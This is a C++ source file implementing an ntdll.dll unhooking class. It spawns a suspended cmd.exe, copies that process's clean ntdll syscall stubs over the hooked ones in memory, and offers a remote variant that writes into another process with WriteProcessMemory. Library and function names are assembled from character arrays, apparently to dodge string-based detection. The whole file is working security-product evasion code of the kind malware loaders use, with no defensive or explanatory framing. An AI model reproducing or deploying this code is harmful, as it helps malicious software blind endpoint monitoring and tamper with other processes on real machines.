#include <winternl.h>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <Tlhelp32.h>
#include <psapi.h>

using namespace std;

wchar_t sNtdllW[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0x0 };
wchar_t sKernel32W[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0x0 };

class Unhooker {
public:
	typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
	
    static int LocateFirstSyscall(char* pMem, DWORD size) {
        DWORD i = 0;
        DWORD offset = 0;
        BYTE pattern1[] = "\x0f\x05\xc3";
        BYTE pattern2[] = "\xcc\xcc\xcc";

        for (i = 0; i < size - 3; i++) {
            if (!memcmp(pMem + i, pattern1, 3)) {
                offset = i;
                break;
            }
        }

        for (i = 3; i < 50; i++) {
            if (!memcmp(pMem + offset - i, pattern2, 3)) {
                offset = offset - i + 3;
                break;
            }
        }

        return offset;
    }

    static int LocateLastSysCall(char* pMem, DWORD size) {
        DWORD i;
        DWORD offset = 0;
        BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";

        for (i = size - 9; i > 0; i--) {
            if (!memcmp(pMem + i, pattern, 9)) {
                offset = i + 6;
                break;
            }
        }

        return offset;
    }

    static int RemoveHookFromNtdll(const HMODULE hNtdll, const LPVOID pCache) {
        DWORD oldProtection = 0;
        PIMAGE_DOS_HEADER pImgDOSHeader = (PIMAGE_DOS_HEADER)pCache;
        PIMAGE_NT_HEADERS pImgNTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCache + pImgDOSHeader->e_lfanew);
        int i;
        unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

        VirtualProtect_t VirtualProtectFunction = (VirtualProtect_t)GetProcAddress(GetModuleHandle(sKernel32W), (LPCSTR)sVirtualProtect);

        for (i = 0; i < pImgNTHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER pImgSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            if (!strcmp((char*)pImgSectionHeader->Name, ".text")) {
                VirtualProtectFunction((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHeader->VirtualAddress), pImgSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);

                DWORD SC_start = LocateFirstSyscall((char*)pCache, pImgSectionHeader->Misc.VirtualSize);
                DWORD SC_end = LocateLastSysCall((char*)pCache, pImgSectionHeader->Misc.VirtualSize);

                if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                    DWORD SC_size = SC_end - SC_start;
                    memcpy((LPVOID)((DWORD_PTR)hNtdll + SC_start),
                        (LPVOID)((DWORD_PTR)pCache + +SC_start),
                        SC_size);
                }

                VirtualProtectFunction((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHeader->VirtualAddress), pImgSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);

                if (!oldProtection) {
                    return -1;
                }
                return 0;
            }
        }

        return -1;
    }

    static int RemoteRemoveHookFromNtdll(const HMODULE hNtdll, const LPVOID pCache, HANDLE hProcess) {
        DWORD oldProtection = 0;
        PIMAGE_DOS_HEADER pImgDOSHeader = (PIMAGE_DOS_HEADER)pCache;
        PIMAGE_NT_HEADERS pImgNTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCache + pImgDOSHeader->e_lfanew);
        int i;
        unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

        VirtualProtect_t VirtualProtectFunction = (VirtualProtect_t)GetProcAddress(GetModuleHandle(sKernel32W), (LPCSTR)sVirtualProtect);

        for (i = 0; i < pImgNTHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER pImgSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            if (!strcmp((char*)pImgSectionHeader->Name, ".text")) {
                VirtualProtectFunction((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHeader->VirtualAddress), pImgSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);

                DWORD SC_start = LocateFirstSyscall((char*)pCache, pImgSectionHeader->Misc.VirtualSize);
                DWORD SC_end = LocateLastSysCall((char*)pCache, pImgSectionHeader->Misc.VirtualSize);

                if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                    DWORD SC_size = SC_end - SC_start;

                    // Escribir en la memoria del proceso remoto
                    WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hNtdll + SC_start), (LPVOID)((DWORD_PTR)pCache + SC_start), SC_size, NULL);
                }

                VirtualProtectFunction((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHeader->VirtualAddress), pImgSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);

                if (!oldProtection) {
                    return -1;
                }
                return 0;
            }
        }

        return -1;
    }

    static int unHookNtdll() {
        HANDLE hProcess = NULL;
        int result = 0;
        STARTUPINFOA startupInfo = { 0 };
        PROCESS_INFORMATION processInfo = { 0 };
        BOOL createSuccess = CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, "C:\\Windows\\System32\\", &startupInfo, &processInfo);

        if (createSuccess == FALSE) {
            return 1;
        }

        char* pNtdllAddress = (char*)GetModuleHandle(L"ntdll.dll");
        IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pNtdllAddress;
        IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)(pNtdllAddress + pDosHeader->e_lfanew);
        IMAGE_OPTIONAL_HEADER* pOptionalHeader = &pNTHeader->OptionalHeader;

        SIZE_T ntdllSize = pOptionalHeader->SizeOfImage;

        LPVOID pCache = VirtualAlloc(NULL, ntdllSize, MEM_COMMIT, PAGE_READWRITE);

        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(processInfo.hProcess, pNtdllAddress, pCache, ntdllSize, &bytesRead))

            TerminateProcess(processInfo.hProcess, 0);

        result = RemoveHookFromNtdll(GetModuleHandle(sNtdllW), pCache);

        VirtualFree(pCache, 0, MEM_RELEASE);
        return 0;
    }

    static int unHookNtdllRemote(DWORD processId) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (hProcess == NULL) {
            return 1;
        }

        char* pNtdllAddress = (char*)GetModuleHandle(L"ntdll.dll");
        IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pNtdllAddress;
        IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)(pNtdllAddress + pDosHeader->e_lfanew);
        IMAGE_OPTIONAL_HEADER* pOptionalHeader = &pNTHeader->OptionalHeader;

        SIZE_T ntdllSize = pOptionalHeader->SizeOfImage;

        LPVOID pCache = VirtualAlloc(NULL, ntdllSize, MEM_COMMIT, PAGE_READWRITE);

        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(hProcess, pNtdllAddress, pCache, ntdllSize, &bytesRead))
            TerminateProcess(hProcess, 0);

        int result = RemoteRemoveHookFromNtdll(GetModuleHandle(sNtdllW), pCache, hProcess);

        VirtualFree(pCache, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
};